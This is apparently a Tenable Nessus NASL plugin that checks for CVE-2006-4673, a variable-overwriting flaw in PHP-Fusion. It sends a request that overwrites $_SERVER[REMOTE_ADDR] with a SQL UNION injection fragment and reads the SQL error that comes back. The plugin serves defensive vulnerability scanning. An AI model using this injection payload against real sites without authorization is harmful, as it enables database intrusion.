#
# (C) Tenable Network Security
#


if (description)
{
  script_id(22316);
  script_version("$Revision: 1.4 $");

  script_cve_id("CVE-2006-4673");
  script_bugtraq_id(19908, 19910);

  script_name(english:"PHP-Fusion extract() Variable Overwriting Vulnerabilities");
  script_summary(english:"Tries to overwrite $_SERVER[REMOTE_ADDR] with PHP-Fusion");

  desc = "
Synopsis :

The remote web server contains a PHP script that is affected by a
variable overwriting flaw. 

Description :

The version of PHP-Fusion on the remote host supports registering
variables from user-supplied input in the event that PHP's
'register_globals' setting is disabled, which is the default in
current versions of PHP.  Unfortunately, the way in which this has
been implemented in the version on the remote host does not restrict
the variables that can be registered.  Thus, an unauthenticated remote
attacker can leverage this flaw to launch various attacks against the
affected application. 

See also :

http://retrogod.altervista.org/phpfusion_6-01-4_xpl.html
http://www.securityfocus.com/archive/1/445480/30/0/threaded

Solution :

Unknown at this time.

Risk factor :

Low / CVSS Base Score : 1.8
(AV:R/AC:H/Au:NR/C:N/I:P/A:N/B:N)";
  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("php_fusion_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/php-fusion"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  dir = matches[2];

  # Try to exploit the flaw to generate a SQL error.
  host = string(
    rand() % 255, ".", rand() % 255, ".", rand() % 255, ".111",
    "'/**/UNION+SELECT+", SCRIPT_NAME, "/*"
  );
  req = http_get(
    item:string(
      dir, "/news.php?",
      "_SERVER[REMOTE_ADDR]=", host
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if we see an error w/ the first 3 octets of our "host".
  if (string("syntax to use near '", host - strstr(host, ".111"), "''") >< res)
  {
    security_note(port);
    exit(0);
  }
}
